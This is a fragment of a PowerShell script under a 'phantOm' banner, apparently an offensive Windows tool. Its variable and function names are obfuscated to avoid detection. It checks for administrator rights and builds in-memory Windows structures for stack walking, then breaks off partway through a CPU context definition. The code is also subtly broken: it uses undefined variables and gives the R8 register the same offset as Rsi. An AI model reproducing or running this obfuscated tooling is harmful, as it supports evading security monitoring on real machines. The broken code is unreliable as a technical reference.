function triples {

[CmdLetBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $true)]
        [String[]]$TLWgW9gRYBpzHcx,

        [Parameter(ParameterSetName = 'Id')]
        [ValidateNotNullOrEmpty()]
        [Int]$Id = -1
    )

    $intro = @'

        _                 _    ___
  _ __ | |__   __ _ _ __ | |_ / _ \ _ __ ___
 | '_ \| '_ \ / _` | '_ \| __| | | | '_ ` _ \
 | |_) | | | | (_| | | | | |_| |_| | | | | | |
 | .__/|_| |_|\__,_|_| |_|\__|\___/|_| |_| |_|
 |_|

'@

    Write-Host $intro -ForegroundColor Cyan

    Write-Host ""
    Write-Host "[!] I'm here to blur the line between life and death..." -ForegroundColor Cyan
    Write-Host ""

    $QzKzGikBpwmZGCD = {
        Param (
            [Parameter()]
            [String]$Name,

            [Parameter()]
            [Int]$Id
        )
        if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            Write-Warning "This script should be ran with administrative priviliges."
        }
        $Bn9WoqHKBpWeFCu = [AppDomain]::CurrentDomain
        $snQMNX9JpaaPyef = New-Object -TypeName System.Reflection.AssemblyName -ArgumentList ('PowerWalker')
        $mv99P9xzgkvSrGQ = $Bn9WoqHKBpWeFCu.DefineDynamicAssembly($snQMNX9JpaaPyef, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $zfgSAXsTKOt99qC = $mv99P9xzgkvSrGQ.DefineDynamicModule('InMemoryModule', $false)
        $e9glU9dBG9cvIBE = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]




        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineEnum('ProcessorArch', 'Public', [UInt16])
        [void]$9fHVCEzPCyBRX99.DefineLiteral('PROCESSOR_ARCHITECTURE_INTEL', [UInt16] 0)
        [void]$9fHVCEzPCyBRX99.DefineLiteral('PROCESSOR_ARCHITECTURE_MIPS', [UInt16] 0x01)
        [void]$9fHVCEzPCyBRX99.DefineLiteral('PROCESSOR_ARCHITECTURE_ALPHA', [UInt16] 0x02)
        [void]$9fHVCEzPCyBRX99.DefineLiteral('PROCESSOR_ARCHITECTURE_PPC', [UInt16] 0x03)
        [void]$9fHVCEzPCyBRX99.DefineLiteral('PROCESSOR_ARCHITECTURE_SHX', [UInt16] 0x04)
        [void]$9fHVCEzPCyBRX99.DefineLiteral('PROCESSOR_ARCHITECTURE_ARM', [UInt16] 0x05)
        [void]$9fHVCEzPCyBRX99.DefineLiteral('PROCESSOR_ARCHITECTURE_IA64', [UInt16] 0x06)
        [void]$9fHVCEzPCyBRX99.DefineLiteral('PROCESSOR_ARCHITECTURE_ALPHA64', [UInt16] 0x07)
        [void]$9fHVCEzPCyBRX99.DefineLiteral('PROCESSOR_ARCHITECTURE_AMD64', [UInt16] 0x09)
        [void]$9fHVCEzPCyBRX99.DefineLiteral('PROCESSOR_ARCHITECTURE_UNKNOWN', [UInt16] 0xFFFF)
        $fhqHVSecULqcDD9:ProcessorArch = $9fHVCEzPCyBRX99.CreateType()



        $TtNk9FTzCqqOb9h = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('SYSTEM_INFO', $TtNk9FTzCqqOb9h, [ValueType])
        [void]$9fHVCEzPCyBRX99.DefineField('ProcessorArchitecture', $AKYBQT9gRfzBOuH, 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Reserved', [Int16], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('PageSize', [Int32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('MinimumApplicationAddress', [IntPtr], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('MaximumApplicationAddress', [IntPtr], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('ActiveProcessorMask', [IntPtr], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('NumberOfProcessors', [Int32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('ProcessorType', [Int32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('AllocationGranularity', [Int32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('ProcessorLevel', [Int16], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('ProcessorRevision', [Int16], 'Public')
        $fhqHVSecULqcDD9:SYSTEM_INFO = $9fHVCEzPCyBRX99.CreateType()



        $TtNk9FTzCqqOb9h = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('MODULE_INFO', $TtNk9FTzCqqOb9h, [ValueType], 12)
        [void]$9fHVCEzPCyBRX99.DefineField('lpBaseOfDll', [IntPtr], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('SizeOfImage', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('EntryPoint', [IntPtr], 'Public')
        $fhqHVSecULqcDD9:MODULE_INFO = $9fHVCEzPCyBRX99.CreateType()



        $TtNk9FTzCqqOb9h = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('KDHELP', $TtNk9FTzCqqOb9h, [ValueType])
        [void]$9fHVCEzPCyBRX99.DefineField('Thread', [UInt64], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('ThCallbackStack', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('ThCallbackBStore', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('NextCallback', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('FramePointer', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('KiCallUserMode', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('KeUserCallbackDispatcher', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('SystemRangeStart', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('KiUserExceptionDispatcher', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('StackBase', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('StackLimit', [UInt32], 'Public')
        $fMcCwCaOUPbIiRo = $9fHVCEzPCyBRX99.DefineField('Reserved', [UInt64[]], 'Public')
        $VecHbgxegUKSrSi = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $ONUgkYcgSPHwJea = [Runtime.InteropServices.UnmanagedType]::ByValArray
        $mYFUJEwGpLtWPMx = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($e9glU9dBG9cvIBE, $ONUgkYcgSPHwJea, $VecHbgxegUKSrSi, @([Int32] 5))
        [void]$fMcCwCaOUPbIiRo.SetCustomAttribute($mYFUJEwGpLtWPMx)
        $9vsvRyatechscjg = $9fHVCEzPCyBRX99.CreateType()



        $TtNk9FTzCqqOb9h = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('ADDRESS64', $TtNk9FTzCqqOb9h, [ValueType])
        [void]$9fHVCEzPCyBRX99.DefineField('Offset', [UInt64], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Segment', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Mode', [UInt32], 'Public')
        $fhqHVSecULqcDD9:ADDRESS64 = $9fHVCEzPCyBRX99.CreateType()



        $TtNk9FTzCqqOb9h = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('STACKFRAME64', $TtNk9FTzCqqOb9h, [ValueType])
        [void]$9fHVCEzPCyBRX99.DefineField('AddrPC', $KwGcTmeuLfo9uc9, 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('AddrReturn', $KwGcTmeuLfo9uc9, 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('AddrFrame', $KwGcTmeuLfo9uc9, 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('AddrStack', $KwGcTmeuLfo9uc9, 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('AddrBStore', $KwGcTmeuLfo9uc9, 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('FuncTableEntry', [IntPtr], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Offset', [UInt64], 'Public')
        $LAgDwRxfmuTmsAf = $9fHVCEzPCyBRX99.DefineField('Params', [UInt64[]], 'Public')
        $mYFUJEwGpLtWPMx = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($e9glU9dBG9cvIBE, $ONUgkYcgSPHwJea, $VecHbgxegUKSrSi, @([Int32] 4))
        [void]$LAgDwRxfmuTmsAf.SetCustomAttribute($mYFUJEwGpLtWPMx)
        [void]$9fHVCEzPCyBRX99.DefineField('Far', [Bool], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Virtual', [Bool], 'Public')
        $fMcCwCaOUPbIiRo = $9fHVCEzPCyBRX99.DefineField('Reserved', [UInt64[]], 'Public')
        $mYFUJEwGpLtWPMx = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($e9glU9dBG9cvIBE, $ONUgkYcgSPHwJea, $VecHbgxegUKSrSi, @([Int32] 3))
        [void]$fMcCwCaOUPbIiRo.SetCustomAttribute($mYFUJEwGpLtWPMx)
        [void]$9fHVCEzPCyBRX99.DefineField('KdHelp', $9vsvRyatechscjg, 'Public')
        $fhqHVSecULqcDD9:STACKFRAME64 = $9fHVCEzPCyBRX99.CreateType()



        $TtNk9FTzCqqOb9h = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('IMAGEHLP_SYMBOLW64', $TtNk9FTzCqqOb9h, [ValueType])
        [void]$9fHVCEzPCyBRX99.DefineField('SizeOfStruct', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Address', [UInt64], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Size', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Flags', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('MaxNameLength', [UInt32], 'Public')
        $iUgFkzfRbMf9XGE = $9fHVCEzPCyBRX99.DefineField('Name', [Char[]], 'Public')
        $mYFUJEwGpLtWPMx = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($e9glU9dBG9cvIBE, $ONUgkYcgSPHwJea, $VecHbgxegUKSrSi, @([Int32] 33))
        [void]$iUgFkzfRbMf9XGE.SetCustomAttribute($mYFUJEwGpLtWPMx)
        $fhqHVSecULqcDD9:IMAGEHLP_SYMBOLW64 = $9fHVCEzPCyBRX99.CreateType()



        $TtNk9FTzCqqOb9h = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('FLOAT128', $TtNk9FTzCqqOb9h, [ValueType])
        [void]$9fHVCEzPCyBRX99.DefineField('LowPart', [Int64], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('HighPart', [Int64], 'Public')
        $g9bxVTrxvZSRMxP = $9fHVCEzPCyBRX99.CreateType()



        $TtNk9FTzCqqOb9h = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('FLOATING_SAVE_AREA', $TtNk9FTzCqqOb9h, [ValueType])
        [void]$9fHVCEzPCyBRX99.DefineField('ControlWord', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('StatusWord', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('TagWord', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('ErrorOffset', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('ErrorSelector', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('DataOffset', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('DataSelector', [UInt32], 'Public')
        $xXHvRjSAW9CMxve = $9fHVCEzPCyBRX99.DefineField('RegisterArea', [Byte[]], 'Public')
        $mYFUJEwGpLtWPMx = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($e9glU9dBG9cvIBE, $ONUgkYcgSPHwJea, $VecHbgxegUKSrSi, @([Int32] 80))
        [void]$xXHvRjSAW9CMxve.SetCustomAttribute($mYFUJEwGpLtWPMx)
        [void]$9fHVCEzPCyBRX99.DefineField('Cr0NpxState', [UInt32], 'Public')
        $9OgMpsmrCGV9w9P = $9fHVCEzPCyBRX99.CreateType()



        $TtNk9FTzCqqOb9h = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('X86_CONTEXT', $TtNk9FTzCqqOb9h, [ValueType])
        [void]$9fHVCEzPCyBRX99.DefineField('ContextFlags', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Dr0', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Dr1', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Dr2', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Dr3', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Dr6', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Dr7', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('FloatSave', $9OgMpsmrCGV9w9P, 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('SegGs', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('SegFs', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('SegEs', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('SegDs', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Edi', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Esi', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Ebx', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Edx', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Ecx', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Eax', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Ebp', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Eip', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('SegCs', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('EFlags', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('Esp', [UInt32], 'Public')
        [void]$9fHVCEzPCyBRX99.DefineField('SegSs', [UInt32], 'Public')
        $daWZgRREeyfXGIq = $9fHVCEzPCyBRX99.DefineField('ExtendedRegisters', [Byte[]], 'Public')
        $mYFUJEwGpLtWPMx = New-Object -TypeName System.Reflection.Emit.CustomAttributeBuilder -ArgumentList ($e9glU9dBG9cvIBE, $ONUgkYcgSPHwJea, $VecHbgxegUKSrSi, @([Int32] 512))
        [void]$daWZgRREeyfXGIq.SetCustomAttribute($mYFUJEwGpLtWPMx)
        $fhqHVSecULqcDD9:X86_CONTEXT = $9fHVCEzPCyBRX99.CreateType()



        $TtNk9FTzCqqOb9h = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('AMD64_CONTEXT', $TtNk9FTzCqqOb9h, [ValueType])
        ($9fHVCEzPCyBRX99.DefineField('P1Home', [UInt64], 'Public')).SetOffset(0x0)
        ($9fHVCEzPCyBRX99.DefineField('P2Home', [UInt64], 'Public')).SetOffset(0x8)
        ($9fHVCEzPCyBRX99.DefineField('P3Home', [UInt64], 'Public')).SetOffset(0x10)
        ($9fHVCEzPCyBRX99.DefineField('P4Home', [UInt64], 'Public')).SetOffset(0x18)
        ($9fHVCEzPCyBRX99.DefineField('P5Home', [UInt64], 'Public')).SetOffset(0x20)
        ($9fHVCEzPCyBRX99.DefineField('P6Home', [UInt64], 'Public')).SetOffset(0x28)
        ($9fHVCEzPCyBRX99.DefineField('ContextFlags', [UInt32], 'Public')).SetOffset(0x30)
        ($9fHVCEzPCyBRX99.DefineField('MxCsr', [UInt32], 'Public')).SetOffset(0x34)
        ($9fHVCEzPCyBRX99.DefineField('SegCs', [UInt16], 'Public')).SetOffset(0x38)
        ($9fHVCEzPCyBRX99.DefineField('SegDs', [UInt16], 'Public')).SetOffset(0x3a)
        ($9fHVCEzPCyBRX99.DefineField('SegEs', [UInt16], 'Public')).SetOffset(0x3c)
        ($9fHVCEzPCyBRX99.DefineField('SegFs', [UInt16], 'Public')).SetOffset(0x3e)
        ($9fHVCEzPCyBRX99.DefineField('SegGs', [UInt16], 'Public')).SetOffset(0x40)
        ($9fHVCEzPCyBRX99.DefineField('SegSs', [UInt16], 'Public')).SetOffset(0x42)
        ($9fHVCEzPCyBRX99.DefineField('EFlags', [UInt32], 'Public')).SetOffset(0x44)
        ($9fHVCEzPCyBRX99.DefineField('Dr0', [UInt64], 'Public')).SetOffset(0x48)
        ($9fHVCEzPCyBRX99.DefineField('Dr1', [UInt64], 'Public')).SetOffset(0x50)
        ($9fHVCEzPCyBRX99.DefineField('Dr2', [UInt64], 'Public')).SetOffset(0x58)
        ($9fHVCEzPCyBRX99.DefineField('Dr3', [UInt64], 'Public')).SetOffset(0x60)
        ($9fHVCEzPCyBRX99.DefineField('Dr6', [UInt64], 'Public')).SetOffset(0x68)
        ($9fHVCEzPCyBRX99.DefineField('Dr7', [UInt64], 'Public')).SetOffset(0x70)
        ($9fHVCEzPCyBRX99.DefineField('Rax', [UInt64], 'Public')).SetOffset(0x78)
        ($9fHVCEzPCyBRX99.DefineField('Rcx', [UInt64], 'Public')).SetOffset(0x80)
        ($9fHVCEzPCyBRX99.DefineField('Rdx', [UInt64], 'Public')).SetOffset(0x88)
        ($9fHVCEzPCyBRX99.DefineField('Rbx', [UInt64], 'Public')).SetOffset(0x90)
        ($9fHVCEzPCyBRX99.DefineField('Rsp', [UInt64], 'Public')).SetOffset(0x98)
        ($9fHVCEzPCyBRX99.DefineField('Rbp', [UInt64], 'Public')).SetOffset(0xa0)
        ($9fHVCEzPCyBRX99.DefineField('Rsi', [UInt64], 'Public')).SetOffset(0xa8)
        ($9fHVCEzPCyBRX99.DefineField('Rdi', [UInt64], 'Public')).SetOffset(0xb0)
        ($9fHVCEzPCyBRX99.DefineField('R8', [UInt64], 'Public')).SetOffset(0xa8)
        ($9fHVCEzPCyBRX99.DefineField('R9', [UInt64], 'Public')).SetOffset(0xc0)
        ($9fHVCEzPCyBRX99.DefineField('R10', [UInt64], 'Public')).SetOffset(0xc8)
        ($9fHVCEzPCyBRX99.DefineField('R11', [UInt64], 'Public')).SetOffset(0xd0)
        ($9fHVCEzPCyBRX99.DefineField('R12', [UInt64], 'Public')).SetOffset(0xd8)
        ($9fHVCEzPCyBRX99.DefineField('R13', [UInt64], 'Public')).SetOffset(0xe0)
        ($9fHVCEzPCyBRX99.DefineField('R14', [UInt64], 'Public')).SetOffset(0xe8)
        ($9fHVCEzPCyBRX99.DefineField('R15', [UInt64], 'Public')).SetOffset(0xf0)
        ($9fHVCEzPCyBRX99.DefineField('Rip', [UInt64], 'Public')).SetOffset(0xf8)
        ($9fHVCEzPCyBRX99.DefineField('FltSave', [UInt64], 'Public')).SetOffset(0x100)
        ($9fHVCEzPCyBRX99.DefineField('Legacy', [UInt64], 'Public')).SetOffset(0x120)
        ($9fHVCEzPCyBRX99.DefineField('Xmm0', [UInt64], 'Public')).SetOffset(0x1a0)
        ($9fHVCEzPCyBRX99.DefineField('Xmm1', [UInt64], 'Public')).SetOffset(0x1b0)
        ($9fHVCEzPCyBRX99.DefineField('Xmm2', [UInt64], 'Public')).SetOffset(0x1c0)
        ($9fHVCEzPCyBRX99.DefineField('Xmm3', [UInt64], 'Public')).SetOffset(0x1d0)
        ($9fHVCEzPCyBRX99.DefineField('Xmm4', [UInt64], 'Public')).SetOffset(0x1e0)
        ($9fHVCEzPCyBRX99.DefineField('Xmm5', [UInt64], 'Public')).SetOffset(0x1f0)
        ($9fHVCEzPCyBRX99.DefineField('Xmm6', [UInt64], 'Public')).SetOffset(0x200)
        ($9fHVCEzPCyBRX99.DefineField('Xmm7', [UInt64], 'Public')).SetOffset(0x210)
        ($9fHVCEzPCyBRX99.DefineField('Xmm8', [UInt64], 'Public')).SetOffset(0x220)
        ($9fHVCEzPCyBRX99.DefineField('Xmm9', [UInt64], 'Public')).SetOffset(0x230)
        ($9fHVCEzPCyBRX99.DefineField('Xmm10', [UInt64], 'Public')).SetOffset(0x240)
        ($9fHVCEzPCyBRX99.DefineField('Xmm11', [UInt64], 'Public')).SetOffset(0x250)
        ($9fHVCEzPCyBRX99.DefineField('Xmm12', [UInt64], 'Public')).SetOffset(0x260)
        ($9fHVCEzPCyBRX99.DefineField('Xmm13', [UInt64], 'Public')).SetOffset(0x270)
        ($9fHVCEzPCyBRX99.DefineField('Xmm14', [UInt64], 'Public')).SetOffset(0x280)
        ($9fHVCEzPCyBRX99.DefineField('Xmm15', [UInt64], 'Public')).SetOffset(0x290)
        ($9fHVCEzPCyBRX99.DefineField('VectorRegister', [UInt64], 'Public')).SetOffset(0x300)
        ($9fHVCEzPCyBRX99.DefineField('VectorControl', [UInt64], 'Public')).SetOffset(0x4a0)
        ($9fHVCEzPCyBRX99.DefineField('DebugControl', [UInt64], 'Public')).SetOffset(0x4a8)
        ($9fHVCEzPCyBRX99.DefineField('LastBranchToRip', [UInt64], 'Public')).SetOffset(0x4b0)
        ($9fHVCEzPCyBRX99.DefineField('LastBranchFromRip', [UInt64], 'Public')).SetOffset(0x4b8)
        ($9fHVCEzPCyBRX99.DefineField('LastExceptionToRip', [UInt64], 'Public')).SetOffset(0x4c0)
        ($9fHVCEzPCyBRX99.DefineField('LastExceptionFromRip', [UInt64], 'Public')).SetOffset(0x4c8)
        $fhqHVSecULqcDD9:AMD64_CONTEXT = $9fHVCEzPCyBRX99.CreateType()



        $TtNk9FTzCqqOb9h = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('IA64_CONTEXT', $TtNk9FTzCqqOb9h, [ValueType])
        ($9fHVCEzPCyBRX99.DefineField('ContextFlags', [UInt64], 'Public')).SetOffset(0x0)
        ($9fHVCEzPCyBRX99.DefineField('DbI0', [UInt64], 'Public')).SetOffset(0x010)
        ($9fHVCEzPCyBRX99.DefineField('DbI1', [UInt64], 'Public')).SetOffset(0x018)
        ($9fHVCEzPCyBRX99.DefineField('DbI2', [UInt64], 'Public')).SetOffset(0x020)
        ($9fHVCEzPCyBRX99.DefineField('DbI3', [UInt64], 'Public')).SetOffset(0x028)
        ($9fHVCEzPCyBRX99.DefineField('DbI4', [UInt64], 'Public')).SetOffset(0x030)
        ($9fHVCEzPCyBRX99.DefineField('DbI5', [UInt64], 'Public')).SetOffset(0x038)
        ($9fHVCEzPCyBRX99.DefineField('DbI6', [UInt64], 'Public')).SetOffset(0x040)
        ($9fHVCEzPCyBRX99.DefineField('DbI7', [UInt64], 'Public')).SetOffset(0x048)
        ($9fHVCEzPCyBRX99.DefineField('DbD0', [UInt64], 'Public')).SetOffset(0x050)
        ($9fHVCEzPCyBRX99.DefineField('DbD1', [UInt64], 'Public')).SetOffset(0x058)
        ($9fHVCEzPCyBRX99.DefineField('DbD2', [UInt64], 'Public')).SetOffset(0x060)
        ($9fHVCEzPCyBRX99.DefineField('DbD3', [UInt64], 'Public')).SetOffset(0x068)
        ($9fHVCEzPCyBRX99.DefineField('DbD4', [UInt64], 'Public')).SetOffset(0x070)
        ($9fHVCEzPCyBRX99.DefineField('DbD5', [UInt64], 'Public')).SetOffset(0x078)
        ($9fHVCEzPCyBRX99.DefineField('DbD6', [UInt64], 'Public')).SetOffset(0x080)
        ($9fHVCEzPCyBRX99.DefineField('DbD7', [UInt64], 'Public')).SetOffset(0x088)
        ($9fHVCEzPCyBRX99.DefineField('FltS0', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x090)
        ($9fHVCEzPCyBRX99.DefineField('FltS1', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x0a0)
        ($9fHVCEzPCyBRX99.DefineField('FltS2', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x0b0)
        ($9fHVCEzPCyBRX99.DefineField('FltS3', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x0c0)
        ($9fHVCEzPCyBRX99.DefineField('FltT0', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x0d0)
        ($9fHVCEzPCyBRX99.DefineField('FltT1', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x0e0)
        ($9fHVCEzPCyBRX99.DefineField('FltT2', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x0f0)
        ($9fHVCEzPCyBRX99.DefineField('FltT3', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x100)
        ($9fHVCEzPCyBRX99.DefineField('FltT4', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x110)
        ($9fHVCEzPCyBRX99.DefineField('FltT5', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x120)
        ($9fHVCEzPCyBRX99.DefineField('FltT6', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x130)
        ($9fHVCEzPCyBRX99.DefineField('FltT7', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x140)
        ($9fHVCEzPCyBRX99.DefineField('FltT8', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x150)
        ($9fHVCEzPCyBRX99.DefineField('FltT9', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x160)
        ($9fHVCEzPCyBRX99.DefineField('FltS4', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x170)
        ($9fHVCEzPCyBRX99.DefineField('FltS5', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x180)
        ($9fHVCEzPCyBRX99.DefineField('FltS6', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x190)
        ($9fHVCEzPCyBRX99.DefineField('FltS7', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x1a0)
        ($9fHVCEzPCyBRX99.DefineField('FltS8', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x1b0)
        ($9fHVCEzPCyBRX99.DefineField('FltS9', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x1c0)
        ($9fHVCEzPCyBRX99.DefineField('FltS10', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x1d0)
        ($9fHVCEzPCyBRX99.DefineField('FltS11', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x1e0)
        ($9fHVCEzPCyBRX99.DefineField('FltS12', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x1f0)
        ($9fHVCEzPCyBRX99.DefineField('FltS13', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x200)
        ($9fHVCEzPCyBRX99.DefineField('FltS14', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x210)
        ($9fHVCEzPCyBRX99.DefineField('FltS15', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x220)
        ($9fHVCEzPCyBRX99.DefineField('FltS16', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x230)
        ($9fHVCEzPCyBRX99.DefineField('FltS17', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x240)
        ($9fHVCEzPCyBRX99.DefineField('FltS18', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x250)
        ($9fHVCEzPCyBRX99.DefineField('FltS19', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x260)
        ($9fHVCEzPCyBRX99.DefineField('FltF32', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x270)
        ($9fHVCEzPCyBRX99.DefineField('FltF33', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x280)
        ($9fHVCEzPCyBRX99.DefineField('FltF34', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x290)
        ($9fHVCEzPCyBRX99.DefineField('FltF35', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x2a0)
        ($9fHVCEzPCyBRX99.DefineField('FltF36', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x2b0)
        ($9fHVCEzPCyBRX99.DefineField('FltF37', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x2c0)
        ($9fHVCEzPCyBRX99.DefineField('FltF38', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x2d0)
        ($9fHVCEzPCyBRX99.DefineField('FltF39', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x2e0)
        ($9fHVCEzPCyBRX99.DefineField('FltF40', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x2f0)
